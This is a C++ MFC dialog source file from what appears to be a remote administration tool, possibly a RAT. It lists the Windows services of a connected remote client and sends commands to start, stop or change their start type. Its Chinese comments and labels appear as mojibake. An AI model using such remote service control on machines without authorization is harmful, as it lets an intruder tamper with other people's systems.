// ServicesDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "ServicesDlg.h"
#include "afxdialogex.h"


// CServicesDlg �Ի���

IMPLEMENT_DYNAMIC(CServicesDlg, CDialog)


CServicesDlg::CServicesDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: CDialog(CServicesDlg::IDD, pParent)
{
	m_ContextObject = ContextObject;
	m_iocpServer = IOCPServer;
}

CServicesDlg::~CServicesDlg()
{
}

void CServicesDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST, m_ControlList);
	DDX_Control(pDX, IDC_STATIC_COUNT, m_ServicesCount);
}


BEGIN_MESSAGE_MAP(CServicesDlg, CDialog)
	ON_WM_CLOSE()
	ON_COMMAND(ID_SERVICES_AUTO, &CServicesDlg::OnServicesAuto)
	ON_COMMAND(ID_SERVICES_MANUAL, &CServicesDlg::OnServicesManual)
	ON_COMMAND(ID_SERVICES_STOP, &CServicesDlg::OnServicesStop)
	ON_COMMAND(ID_SERVICES_START, &CServicesDlg::OnServicesStart)
	ON_COMMAND(ID_SERVICES_REFLASH, &CServicesDlg::OnServicesReflash)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, &CServicesDlg::OnNMRClickList)
END_MESSAGE_MAP()


// CServicesDlg ��Ϣ�������


BOOL CServicesDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	CString strString;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int iClientAddressLength = sizeof(ClientAddress);
	BOOL bResult = getpeername(m_ContextObject->sClientSocket, (SOCKADDR*)&ClientAddress, &iClientAddressLength);
	strString.Format("%s - �������", bResult != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	SetWindowText(strString);

	m_ControlList.SetExtendedStyle( LVS_EX_FULLROWSELECT);
	m_ControlList.InsertColumn(0, "��ʵ����", LVCFMT_LEFT, 150);
	m_ControlList.InsertColumn(1, "��ʾ����", LVCFMT_LEFT, 260);
	m_ControlList.InsertColumn(2, "��������", LVCFMT_LEFT, 80);
	m_ControlList.InsertColumn(3, "����״̬", LVCFMT_LEFT, 80);
	m_ControlList.InsertColumn(4, "��ִ���ļ�·��", LVCFMT_LEFT, 380);

	ShowServicesList();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

int CServicesDlg::ShowServicesList(void)
{
	char	*szBuffer = (char *)(m_ContextObject->InDeCompressedBuffer.GetBuffer(1));
	char	*szDisplayName;
	char	*szServiceName;
	char	*szRunWay;
	char	*szAutoRun;
	char	*szFilePath;
	DWORD	dwOffset = 0;
	m_ControlList.DeleteAllItems();

	int i = 0;
	for (i = 0; dwOffset < m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1; ++i)
	{
		szDisplayName = szBuffer + dwOffset;
		szServiceName = szDisplayName + lstrlen(szDisplayName) +1;
		szFilePath= szServiceName + lstrlen(szServiceName) +1;
		szRunWay = szFilePath + lstrlen(szFilePath) + 1;
		szAutoRun = szRunWay + lstrlen(szRunWay) + 1;

		m_ControlList.InsertItem(i, szServiceName);
		m_ControlList.SetItemText(i, 1, szDisplayName);
		m_ControlList.SetItemText(i, 2, szAutoRun);		
		m_ControlList.SetItemText(i, 3, szRunWay);
		m_ControlList.SetItemText(i, 4, szFilePath );

		dwOffset += lstrlen(szDisplayName) + lstrlen(szServiceName) + lstrlen(szFilePath) + lstrlen(szRunWay)
			+ lstrlen(szAutoRun) +5;
	}

	CString strTemp;
	strTemp.Format("�������:%d",i);

	m_ServicesCount.SetWindowText(strTemp);

	return 0;
}

void CServicesDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
#if CLOSE_DELETE_DLG
	m_ContextObject->v1 = 0;
#endif
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);
	CDialog::OnClose();
#if CLOSE_DELETE_DLG
	delete this;
#endif
}


void CServicesDlg::OnServicesAuto()
{
	ServicesConfig(3);
}


void CServicesDlg::OnServicesManual()
{
	ServicesConfig(4);
}


void CServicesDlg::OnServicesStop()
{
	ServicesConfig(2);
}


void CServicesDlg::OnServicesStart()
{
	ServicesConfig(1);
}


void CServicesDlg::OnServicesReflash()
{
	BYTE bToken = COMMAND_SERVICELIST;   //ˢ��
	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);	
}


void CServicesDlg::OnNMRClickList(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	
	CMenu Menu;
	Menu.LoadMenu(IDR_MENU_SERVICES);
	CMenu *SubMenu=Menu.GetSubMenu(0);
	CPoint	Point;
	GetCursorPos(&Point);
	SubMenu->TrackPopupMenu(TPM_LEFTALIGN|TPM_LEFTBUTTON,Point.x,Point.y,this);
	*pResult = 0;
}


void CServicesDlg::OnReceiveComplete(void)
{
	switch (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SERVERLIST:
		ShowServicesList();
		break;
	default:
		// ���䷢���쳣����
		break;
	}
}

void CServicesDlg::ServicesConfig(BYTE bCmd)
{
	DWORD	dwOffset = 2;
	POSITION Pos = m_ControlList.GetFirstSelectedItemPosition(); 
	int	iItem = m_ControlList.GetNextSelectedItem(Pos);

	CString strServicesName = m_ControlList.GetItemText(iItem, 0 );
	char*	szServiceName = strServicesName.GetBuffer(0);
	LPBYTE  szBuffer = (LPBYTE)LocalAlloc(LPTR, 3 + lstrlen(szServiceName));  //[][][]\0
	szBuffer[0] = COMMAND_SERVICECONFIG;
	szBuffer[1] = bCmd;


	memcpy(szBuffer + dwOffset, szServiceName, lstrlen(szServiceName)+1);

	m_iocpServer->OnClientPreSending(m_ContextObject, szBuffer, LocalSize(szBuffer));
	LocalFree(szBuffer);
}
